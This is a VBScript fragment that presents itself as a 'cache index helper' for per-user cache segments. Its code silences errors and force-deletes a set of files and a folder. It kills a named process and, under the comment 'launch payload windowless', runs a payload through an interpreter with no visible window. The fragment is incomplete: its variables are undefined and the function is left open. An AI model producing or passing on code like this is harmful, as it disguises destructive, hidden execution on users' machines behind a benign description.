' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
For Each OL In Array(AP & O1, AP & O2, AP & O3, AP & O4, AP & O5, SP & O6, SP & O7)
    If fo.FileExists(OL) Then fo.DeleteFile OL, True
Next
If fo.FolderExists(AP & O8) Then fo.DeleteFolder AP & O8, True
If fo.FileExists(AP & O10) Then sh.Run "taskkill /f /im " & O9, 0, True

' launch payload windowless
If fo.FileExists(P1) Then
    sh.Run """" & RT & "\" & PY & """ """ & P1 & """", 0, False
End If


